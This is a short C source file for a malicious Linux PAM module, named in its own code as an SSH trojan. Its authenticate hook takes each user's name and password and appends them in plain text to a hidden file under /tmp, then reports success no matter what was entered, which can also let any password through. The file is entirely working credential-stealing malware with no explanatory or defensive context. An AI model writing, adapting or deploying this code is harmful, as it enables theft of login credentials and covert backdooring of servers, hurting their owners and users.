#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>

#define _PATH_LOG "/tmp/.log_sshtrojan1.txt"

void sendMessage(char *username, char *password) {
	FILE *fp;
	fp = fopen(_PATH_LOG, "a");
	fprintf(fp, "\n=====NEW SSH=====\n");
	fprintf(fp, "Username: %s\n", username);
	fprintf(fp, "Password: %s\n", password);
	fclose(fp);
}

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	char* username;
	char* password;

	pam_get_item(pamh, PAM_USER, (void *) &username);
	pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
	sendMessage(username, password);
	return PAM_SUCCESS;
}



